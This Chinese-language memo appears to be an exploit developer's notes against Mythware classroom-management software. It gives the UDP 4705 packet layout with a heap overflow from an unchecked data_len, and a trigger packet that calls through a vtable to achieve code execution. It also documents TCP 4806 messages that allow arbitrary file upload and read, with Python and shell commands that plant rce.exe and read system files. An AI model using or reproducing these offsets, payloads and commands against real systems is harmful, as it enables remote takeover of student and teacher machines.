# 报文备忘

当时对着脚本和内存对出来的偏移。别死记，`exploit/mythware_poc.py` 和 `exploit/media_upload.py` 里都有现成的组包代码。

多字节整数都是小端。IP 字段直接写点分 IPv4 的 4 个字节，不是字符串。

## UDP 4705 块包

总共 1440 字节，头 `0x3c`。

| 偏移 | 长度 | 说明 |
|---|---|---|
| `0x00` | 4 | magic `0x424C434B`（线上 `4B 43 4C 42`） |
| `0x04` | 4 | 版本 `0x00010000` |
| `0x08` | 4 | 长度字段，通常 `1412` |
| `0x0c` | 16 | GUID |
| `0x1c` | 4 | type：`1` 数据，`3` 只创建 |
| `0x20` | 4 | 0 |
| `0x24` | 4 | 教师端本机 IP（4 字节） |
| `0x28` | 4 | 0 |
| `0x2c` | 4 | `total_size` |
| `0x30` | 4 | 块索引；写到 `buf + index*0x400` |
| `0x34` | 4 | 序号，一般 0 |
| `0x38` | 4 | `data_len` |
| `0x3c` | `data_len` | 数据 |

服务端只查 `index < blocks`，不查 `data_len` 和总边界，所以 `total_size=1, index=0, data_len=1379` 会溢出 1378 字节。

## 触发包

`0x1c` 字节。

| 偏移 | 长度 | 说明 |
|---|---|---|
| `0x00` | 1-4 | 命令，ASCII；不足 4 字节补 NUL |
| `0x04` | 4 | 版本 `0x00010000`，首字节 NUL 会截断命令 |
| `0x08` | 4 | 0 |
| `0x0c` | 16 | 目标 GUID |

分发器先按 GUID 找事务，命中后 `call [H->vtable+0xc]`。所以触发包不用块 magic。

```python
from mythware_poc import build_packet
from remote_batch_rce import make_trigger

g = b"\x11" * 16
create = build_packet("172.27.144.1", g, 3, 0x50, 0, 0)
fill = (b"\x10\x73\x66\x00" * 30)[:0x78]   # V=0x667310
trig = make_trigger(g, "rce")
```

## TCP 4806

每个消息 12 字节头：`flags=0`、`magic`、`payload_len`。

| magic | 用途 | payload |
|---|---|---|
| `0x42524F57` | BROW | 空，建立上传处理器 |
| `0x55504649` | CREATE | `+0x00` ID；`+0x18/+0x1c` 64 位偏移；`+0x20` UTF-16LE 路径 |
| `0x55504642` | WRITE | `+0x00` ID；`+0x08` 文件数据 |
| `0x4F50454E` | OPEN | `+0x0c` 64 位偏移；`+0x14` UTF-16LE 路径 |

写完后等几毫秒发 RST，避免响应路径把 TeacherMain 弄崩。上传不截断，同名文件尾部会留旧内容。

OPEN 的响应：

- `0x18` 字节 RTER 头：`+0x04` magic `RTER`，`+0x0c` status，`+0x10` 64 位大小；
- 后面是 DATA 块：`0x14` 字节头，`+0x04` magic `ATAD`，`+0x08` 长度（数据+8），`+0x10` 偏移，`+0x14` 开始是文件数据。

```bash
python exploit/media_upload.py rce.exe "F:\Program\Mythware\rce.exe" --delay-ms 30
python exploit/media_read.py --host 127.0.0.1 --port 4806 "C:\Windows\win.ini" --text
```

## 和 2021 的区别

2021 是 UDP `4988`、`V=0x6b8344`，别把这里的包发过去。文件头/媒体端口虽然类似，但块协议和 IAT 地址都变了。
